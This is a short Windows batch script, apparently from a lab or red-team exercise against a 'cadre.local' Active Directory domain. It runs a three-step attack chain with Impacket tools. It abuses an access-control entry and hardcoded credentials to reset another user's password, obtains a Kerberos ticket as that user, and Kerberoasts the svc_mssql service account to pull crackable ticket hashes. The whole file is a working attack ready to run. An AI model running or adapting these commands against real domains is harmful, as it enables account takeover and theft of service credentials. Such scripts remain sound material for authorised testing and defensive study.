@echo off
REM WT002 Kerberoast via ACE#18 bridge (AES path per AGENTS.md fix)
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set KRB5CCNAME=C:\Tools\cadre-attack\analyst_t2.ccache

echo === Step 1: Reset analyst_t2 password via ACE#18 (intern_blue) ===
python %PY%\net.py password -dc-ip dc02.child.cadre.local "child.cadre.local/intern_blue:1nt3rn_Blu3!" analyst_t2 "TempPass123!" 2>&1
echo RESET_RC %ERRORLEVEL%

echo === Step 2: Get TGT for analyst_t2 ===
python %PY%\getTGT.py -dc-ip dc02.child.cadre.local "child.cadre.local/analyst_t2:TempPass123!" 2>&1
echo TGT_RC %ERRORLEVEL%
dir analyst_t2.ccache 2>nul

echo === Step 3: Kerberoast svc_mssql with analyst_t2 TGT (AES) ===
python %PY%\GetUserSPNs.py -k -no-pass -dc-ip dc02.child.cadre.local "child.cadre.local/analyst_t2" -request 2>&1
echo KERB_RC %ERRORLEVEL%
